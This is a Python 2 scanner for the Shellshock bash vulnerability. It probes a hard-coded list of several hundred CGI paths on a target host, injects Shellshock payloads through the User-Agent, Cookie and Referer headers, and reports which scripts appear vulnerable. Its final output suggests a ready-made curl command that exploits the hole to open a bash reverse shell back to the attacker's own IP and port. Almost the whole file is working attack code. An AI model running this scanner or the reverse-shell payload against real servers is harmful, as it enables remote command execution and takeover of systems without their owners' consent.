#! /usr/bin/env python
from urlparse import urlparse
import httplib, time, sys 

if len(sys.argv) < 2:
  print "Usage:"
  print "python shellshock-scan.py http://10.10.10.10"
  print "python shellshock-scan.py https://10.10.10.10:443"
  print "python shellshock-scan.py http://10.10.10.10:82 /usr/share/wordlist/cgi-scripts.lst"
  sys.exit(0)

start = time.time()*1000
url = urlparse(sys.argv[1])
if url.port is None:
  if url.scheme != 'https':
    port = 80
  else:
    port = 443
else:
  port = url.port
try:
  scripts = [line.rstrip('\n') for line in open(sys.argv[2])]
except:
  scripts = ["/cgi-bin/admin.cgi","/cgi-bin/administrator.cgi","/cgi-bin/authLogin.cgi","/cgi-bin/bb-hist.sh","/cgi-bin/banner.cgi","/cgi-bin/book.cgi","/cgi-bin/cgiinfo.cgi","/cgi-bin/cgitest.py","/cgi-bin/cgi_wrapper","/cgi-bin/contact.cgi","/cgi-bin/count.cgi","/cgi-bin/defaultwebpage.cgi","/cgi-bin/download.cgi","/cgi-bin/entropysearch.cgi","/cgi-bin/env.cgi","/cgi-bin/environment.cgi","/cgi-bin/ezmlm-browse","/cgi-bin/formmail.cgi","/cgi-bin/FormMail-clone.cgi","/cgi-bin/guestbook.cgi","/cgi-bin/helpdesk.cgi","/cgi-bin/index.cgi","/cgi-bin/index.php","/cgi-bin/index.pl","/cgi-bin/info.cgi","/cgi-bin/info.sh","/cgi-bin/loadpage.cgi","/cgi-bin/login.cgi","/cgi-bin/login.php","/cgi-bin/login.pl","/cgi-bin/pathtest.pl","/cgi-bin/php","/cgi-bin/php4","/cgi-bin/php5","/cgi-bin/php-cgi","/cgi-bin/php.cgi","/cgi-bin/php.fcgi","/cgi-bin/printenv","/cgi-bin/restore_config.cgi","/cgi-bin/ruby.rb","/cgi-bin/search","/cgi-bin/search.cgi","/cgi-bin/server.php","/cgi-bin/status","/cgi-bin/sysinfo.pl","/cgi-bin/test","/cgi-bin/test-cgi","/cgi-bin/test.cgi","/cgi-bin/test_cgi.php","/cgi-bin/test.cgi.php","/cgi-bin/test_cgi.pl","/cgi-bin/test-cgi.pl","/cgi-bin/test.py","/cgi-bin/test.sh","/cgi-bin/tmUnblock.cgi","/cgi-bin/uname.cgi","/cgi-bin/viewcvs.cgi","/cgi-bin/welcome","/cgi-bin/whois.cgi","/cgi-sys/admin.cgi","/cgi-sys/administrator.cgi","/cgi-sys/authLogin.cgi","/cgi-sys/bb-hist.sh","/cgi-sys/banner.cgi","/cgi-sys/book.cgi","/cgi-sys/cgiinfo.cgi","/cgi-sys/cgitest.py","/cgi-sys/cgi_wrapper","/cgi-sys/contact.cgi","/cgi-sys/count.cgi","/cgi-sys/defaultwebpage.cgi","/cgi-sys/download.cgi","/cgi-sys/entropysearch.cgi","/cgi-sys/env.cgi","/cgi-sys/environment.cgi","/cgi-sys/ezmlm-browse","/cgi-sys/formmail.cgi","/cgi-sys/FormMail-clone.cgi","/cgi-sys/guestbook.cgi","/cgi-sys/helpdesk.cgi","/cgi-sys/index.cgi","/cgi-sys/index.php","/cgi-sys/index.pl","/cgi-sys/info.cgi","/cgi-sys/info.sh","/cgi-sys/loadpage.cgi","/cgi-sys/login.cgi","/cgi-sys/login.php","/cgi-sys/login.pl","/cgi-sys/pathtest.pl","/cgi-sys/php","/cgi-sys/php4","/cgi-sys/php5","/cgi-sys/php-cgi","/cgi-sys/php.cgi","/cgi-sys/php.fcgi","/cgi-sys/printenv","/cgi-sys/restore_config.cgi","/cgi-sys/ruby.rb","/cgi-sys/search","/cgi-sys/search.cgi","/cgi-sys/server.php","/cgi-sys/status","/cgi-sys/sysinfo.pl","/cgi-sys/test","/cgi-sys/test-cgi","/cgi-sys/test.cgi","/cgi-sys/test_cgi.php","/cgi-sys/test.cgi.php","/cgi-sys/test_cgi.pl","/cgi-sys/test-cgi.pl","/cgi-sys/test.py","/cgi-sys/test.sh","/cgi-sys/tmUnblock.cgi","/cgi-sys/uname.cgi","/cgi-sys/viewcvs.cgi","/cgi-sys/welcome","/cgi-sys/whois.cgi","/fcgi-bin/index.php","/fcgi-bin/login.php","/fcgi-bin/php","/fcgi-bin/server.php","/fcgi-bin/test_cgi.php","/fcgi-bin/test.cgi.php","/cgi-bin-sdb/admin.cgi","/cgi-bin-sdb/administrator.cgi","/cgi-bin-sdb/authLogin.cgi","/cgi-bin-sdb/banner.cgi","/cgi-bin-sdb/book.cgi","/cgi-bin-sdb/cgiinfo.cgi","/cgi-bin-sdb/cgi_wrapper","/cgi-bin-sdb/contact.cgi","/cgi-bin-sdb/count.cgi","/cgi-bin-sdb/defaultwebpage.cgi","/cgi-bin-sdb/download.cgi","/cgi-bin-sdb/entropysearch.cgi","/cgi-bin-sdb/env.cgi","/cgi-bin-sdb/environment.cgi","/cgi-bin-sdb/ezmlm-browse","/cgi-bin-sdb/formmail.cgi","/cgi-bin-sdb/FormMail-clone.cgi","/cgi-bin-sdb/guestbook.cgi","/cgi-bin-sdb/helpdesk.cgi","/cgi-bin-sdb/index.cgi","/cgi-bin-sdb/info.cgi","/cgi-bin-sdb/loadpage.cgi","/cgi-bin-sdb/login.cgi","/cgi-bin-sdb/php","/cgi-bin-sdb/php4","/cgi-bin-sdb/php5","/cgi-bin-sdb/php-cgi","/cgi-bin-sdb/php.cgi","/cgi-bin-sdb/php.fcgi","/cgi-bin-sdb/printenv","/cgi-bin-sdb/restore_config.cgi","/cgi-bin-sdb/search","/cgi-bin-sdb/search.cgi","/cgi-bin-sdb/status","/cgi-bin-sdb/test","/cgi-bin-sdb/test-cgi","/cgi-bin-sdb/test.cgi","/cgi-bin-sdb/tmUnblock.cgi","/cgi-bin-sdb/uname.cgi","/cgi-bin-sdb/viewcvs.cgi","/cgi-bin-sdb/welcome","/cgi-bin-sdb/whois.cgi","/cgi-mod/admin.cgi","/cgi-mod/administrator.cgi","/cgi-mod/authLogin.cgi","/cgi-mod/bb-hist.sh","/cgi-mod/banner.cgi","/cgi-mod/book.cgi","/cgi-mod/cgiinfo.cgi","/cgi-mod/cgitest.py","/cgi-mod/cgi_wrapper","/cgi-mod/contact.cgi","/cgi-mod/count.cgi","/cgi-mod/defaultwebpage.cgi","/cgi-mod/download.cgi","/cgi-mod/entropysearch.cgi","/cgi-mod/env.cgi","/cgi-mod/environment.cgi","/cgi-mod/ezmlm-browse","/cgi-mod/formmail.cgi","/cgi-mod/FormMail-clone.cgi","/cgi-mod/guestbook.cgi","/cgi-mod/helpdesk.cgi","/cgi-mod/index.cgi","/cgi-mod/index.php","/cgi-mod/index.pl","/cgi-mod/info.cgi","/cgi-mod/info.sh","/cgi-mod/loadpage.cgi","/cgi-mod/login.cgi","/cgi-mod/login.php","/cgi-mod/login.pl","/cgi-mod/pathtest.pl","/cgi-mod/php","/cgi-mod/php4","/cgi-mod/php5","/cgi-mod/php-cgi","/cgi-mod/php.cgi","/cgi-mod/php.fcgi","/cgi-mod/printenv","/cgi-mod/restore_config.cgi","/cgi-mod/ruby.rb","/cgi-mod/search","/cgi-mod/search.cgi","/cgi-mod/server.php","/cgi-mod/status","/cgi-mod/sysinfo.pl","/cgi-mod/test","/cgi-mod/test-cgi","/cgi-mod/test.cgi","/cgi-mod/test_cgi.php","/cgi-mod/test.cgi.php","/cgi-mod/test_cgi.pl","/cgi-mod/test-cgi.pl","/cgi-mod/test.py","/cgi-mod/test.sh","/cgi-mod/tmUnblock.cgi","/cgi-mod/uname.cgi","/cgi-mod/viewcvs.cgi","/cgi-mod/welcome","/cgi-mod/whois.cgi"]

print "[*] shellshock-scan 0.1"
print "[*] by p33kab00 (mudnorb@gmail.com)"
print "[*] # of checks: %i\n" %(len(scripts))

def sendGet( script, payload ):
  if url.scheme != 'https':
    c = httplib.HTTPConnection(url.hostname,port)
  else:
    c = httplib.HTTPSConnection(url.hostname,port)
  if payload is None:
    c.request("GET",script,headers={})
  else:
    c.request("GET",script,headers={"User-Agent":payload,"Cookie":payload,"Referer":payload})
  return c.getresponse()

cntr = 0
hits = 0
vlns = 0
for script in scripts:
  cntr += 1
  try:
    res = sendGet(script, None)
    if res.status == 200:
      hits += 1
      print "\r[+] We've got a candidate: "+script
      test1 = sendGet(script, "() { :;}; echo; echo \"p33kab00\"")
      test2 = sendGet(script, "() { :;}; /bin/bash -c 'echo; echo p33kab00'")
      if test1.status == 200 and "p33kab00" in test1.read():
        vlns += 1
        print "    Whoa - it's vulnerable!\n"
      elif test2.status == 200 and "p33kab00" in test2.read():
        print "    Whoa - it's vulnerable!\n"
        vlns += 1
      elif test1.status == 500:
        print "    Oh - it might be vulnerable.\n"
        vlns += 1
      elif test2.status == 500:
        print "    Oh - it might be vulnerable.\n"
        vlns += 1
      else:
        print "    Nah - Can't tell if it's vulnerable. Give it a go anyway.\n"

    print "\rWorking... {0}%".format(int((float(cntr)/len(scripts))*100)),
  except Exception as e:
    print(e)
    sys.exit(0);

stop = time.time()*1000
if vlns > 0:
  print "\r\b[*] Found %i vulnerable scripts in %i ms." %(vlns, int(stop-start))
else:
  print "\r\b[*] Found %i candidate(s) in %i ms." %(hits, int(stop-start))

if hits > 0:
  print "\n[*] Try something like: \n[*] $ curl -H \"User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1;'\" %s://%s:%i%s" %(url.scheme, url.hostname, port, script)
